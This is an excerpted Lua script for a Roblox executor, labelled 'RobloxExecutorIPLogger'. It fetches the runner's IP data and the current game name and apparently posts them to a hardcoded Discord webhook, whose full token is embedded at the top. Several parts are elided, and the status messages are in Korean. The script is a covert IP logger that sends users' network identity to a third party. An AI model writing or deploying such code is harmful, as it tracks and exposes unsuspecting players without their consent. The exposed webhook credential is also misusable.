local webhook = "https://discordapp.com/api/webhooks/1492529869794316438/FTMB5QH68Y0GcFghVGIYCMukbeDacxkqFwpwWP1nynn1ljVzKwafayk1GAlvz2hDkipB" 
...
local ipSuccess, ipResponse = pcall(function()
    return http_request({
        ...
        Method = "GET",
        Headers = { ["User-Agent"] = "RobloxExecutorIPLogger/1.0" }
    })
end)
...
if ipSuccess then
    ...
    if rawBody ~= "" then
        local decodeSuccess, decoded = pcall(function()
            return game:GetService("HttpService"):JSONDecode(rawBody)
        end)
...
if success then
    ...
    gameName = "가져오기 실패 (" .. tostring(result) .. ")"
end
...
if sendSuccess then
    if type(sendResult) == "table" then
        if sendResult.StatusCode == 204 or sendResult.StatusCode == 200 then
            ...
            if sendResult.Body then
                warn("응답: " .. tostring(sendResult.Body))
            end
        end
    else
